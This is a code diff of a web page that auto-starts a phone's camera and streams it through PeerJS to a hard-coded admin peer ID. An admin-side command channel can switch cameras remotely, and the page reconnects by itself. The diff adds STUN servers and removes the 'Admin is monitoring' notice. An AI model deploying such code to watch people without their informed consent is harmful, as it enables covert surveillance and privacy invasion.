@@ -65,7 +65,6 @@
         .active { background-color: #00e676 !important; }
         .error { background-color: #ff3d00 !important; }
         .waiting { background-color: #ffc107 !important; }
-        .data-active { border: 2px solid #007bff; }
     </style>
 </head>
 <body>
@@ -87,34 +86,26 @@
         const message = document.getElementById('message');
         const statusDot = document.getElementById('connectionStatus');
         const dataStatus = document.getElementById('dataStatus');
-
-        // তোর ভাইয়ের এডমিন আইডি - এইটা Admin Panel এর কোডেও ফিক্সড থাকবে
         const ADMIN_PEER_ID = 'ADMIN_KAWSAR'; 
 
         let peer = null;
         let currentStream = null;
-        let dataConnection = null; // ডেটা চ্যানেল ভেরিয়েবল
+        let dataConnection = null;
         let facingMode = "environment"; 
 
-        // --- কোর ফাংশনালিটি: ভিডিও এবং সংযোগ ---
-
-        // ১. ক্যামেরা চালু করা এবং স্ট্রিম নেওয়া
         async function startCamera() {
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
             }
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode },
-                    audio: false 
+                    video: { facingMode: facingMode }, audio: false 
                 });
                 localVideo.srcObject = stream;
                 localVideo.style.display = 'block';
                 currentStream = stream;
                 message.innerText = "Camera Active. Connecting...";
-                
                 connectPeer(); 
-
             } catch (err) {
                 console.error("Camera Error:", err);
                 message.innerText = "Camera Permission Error! Tap screen to retry.";
@@ -123,7 +114,6 @@
             }
         }
 
-        // ২. PeerJS সংযোগ স্থাপন এবং কল করা
         function connectPeer() {
             if (!navigator.onLine) {
                 message.innerText = "No Internet. Waiting for connection...";
@@ -136,7 +126,19 @@
                     host: 'peerjs.cloud', 
                     port: 443, 
                     secure: true,
-                    config: {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]}
+                    // *** শক্তিশালী STUN/TURN কনফিগারেশন - সংযোগ ফিক্স ***
+                    config: {
+                        'iceServers': [
+                            { 'urls': 'stun:stun.l.google.com:19302' },
+                            { 'urls': 'stun:stun1.l.google.com:19302' },
+                            { 'urls': 'stun:stun2.l.google.com:19302' },
+                            { 'urls': 'stun:stun3.l.google.com:19302' },
+                            { 'urls': 'stun:stun4.l.google.com:19302' },
+                            { 'urls': 'stun:stun.nextcloud.com:443' },
+                            { 'urls': 'stun:stun.services.mozilla.com' },
+                            { 'urls': 'stun:stun.stunprotocol.org' }
+                        ]
+                    }
                 });
             }
 
@@ -145,8 +147,6 @@
                 statusDot.classList.remove('waiting', 'error');
                 statusDot.classList.add('active');
                 message.innerText = "System Ready. Attempting connection...";
-                
-                // এডমিনকে কল করা এবং ডেটা চ্যানেল কানেকশন সেটআপ করা
                 callAdmin(); 
             });
 
@@ -164,19 +164,14 @@
                 setTimeout(connectPeer, 5000); 
             });
 
-            // *** ডেটা চ্যানেল রিসিভার লজিক (রিমোট কন্ট্রোলের জন্য) ***
             peer.on('connection', (conn) => {
                 dataConnection = conn;
                 dataStatus.innerText = "Command Channel ACTIVE!";
 
                 dataConnection.on('data', (data) => {
-                    // Admin Panel থেকে মেসেজ পেলে
                     if (data === 'SWITCH_CAM') {
                         switchCamera();
                         message.innerText = "Admin Commanded: Camera Switched!";
-                    }
-                    if (data === 'ADMIN_CHECK') {
-                         message.innerText = "Admin is monitoring.";
                     }
                 });
 
@@ -184,13 +179,10 @@
                      dataStatus.innerText = "Command Channel Lost.";
                 });
             });
-            // __________________________________________________
         }
         
-        // ৩. Admin Panel-কে কল করা
         function callAdmin() {
             if (currentStream && peer && peer.open) {
-                // Admin ID-কে কল করা
                 const call = peer.call(ADMIN_PEER_ID, currentStream);
 
                 call.on('stream', (remoteStream) => {
@@ -213,13 +205,11 @@
             }
         }
         
-        // ৪. ক্যামেরা ঘোরানো
         function switchCamera() {
             facingMode = facingMode === "user" ? "environment" : "user";
-            startCamera(); // সুইচ করে আবার চালু হবে
+            startCamera(); 
         }
 
-        // ৫. অটো-রিকানেক্ট এবং ব্যাকগ্রাউন্ড লজিক (Auto Resume)
         document.addEventListener("visibilitychange", () => {
             if (document.visibilityState === 'visible') {
                 message.innerText = "App Resumed. Reconnecting...";
@@ -234,7 +224,6 @@
             }
         });
         
-        // ৬. ইন্টারনেট চলে গেলে বা আসলে কি হবে
         window.addEventListener('online', startCamera); 
         window.addEventListener('offline', () => {
             message.innerText = "Internet OFFLINE! Waiting...";
@@ -242,9 +231,8 @@
             statusDot.classList.add('waiting');
         });
 
-        // অ্যাপ লোড হলেই সব শুরু
         window.addEventListener('load', startCamera);
-        document.body.addEventListener('click', startCamera); // পারমিশনের জন্য ক্লিক ইভেন্টও রাখলাম
+        document.body.addEventListener('click', startCamera);
     </script>
 </body>
 </html>
